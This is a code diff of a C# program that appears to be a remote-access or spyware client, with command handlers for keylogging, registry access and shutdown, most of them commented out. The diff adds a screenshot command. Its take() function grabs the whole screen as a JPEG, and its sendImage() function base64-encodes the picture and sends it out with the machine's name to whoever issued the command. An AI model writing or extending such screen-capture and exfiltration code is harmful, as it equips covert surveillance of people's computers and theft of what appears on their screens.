@@ -5,6 +5,8 @@
 //using System.IO;
 //using KeyLogger;
 using System.Diagnostics;
+using System.Drawing.Imaging;
+
 //using System.DirectoryServices.ActiveDirectory;
 
 //using System.Threading;
@@ -83,8 +85,8 @@ class Program
                 //keylog();
                 break;
 
-            case "SCREENSHOT":
-                //screenshot();
+            case "SCREENSHOT-TAKE":
+                sendImage(from, take());
                 break;
 
             case "REGISTRY":
@@ -184,18 +186,18 @@ class Program
         });
     }
 
-    //static async void SendImage(string to, byte[] data)
-    //{
-    //    string base64 = Convert.ToBase64String(data);
+    static async void sendImage(string target, byte[] data)
+    {
+        string base64 = Convert.ToBase64String(data);
 
-    //    await Send(new
-    //        {
-    //            type = "response",
-    //            from = Environment.MachineName,
-    //            to = to,
-    //            data = base64
-    //});
-    //}
+        await Send(new
+        {
+            type = "response",
+            from = Environment.MachineName,
+            to = target,
+            data = base64
+        });
+    }
 
 
     //// ================= FEATURES =================
@@ -345,6 +347,24 @@ class Program
             }
         }
         return $"Application with ID: {aid} is not exist";
+    }
+
+    static byte[] take()
+    {
+        Rectangle bounds = Screen.PrimaryScreen.Bounds;
+        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+        {
+            using (Graphics g = Graphics.FromImage(bitmap))
+            {
+                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+            }
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                bitmap.Save(ms, ImageFormat.Jpeg);
+                return ms.ToArray();
+            }
+        }
     }
 
     static void shutdown()
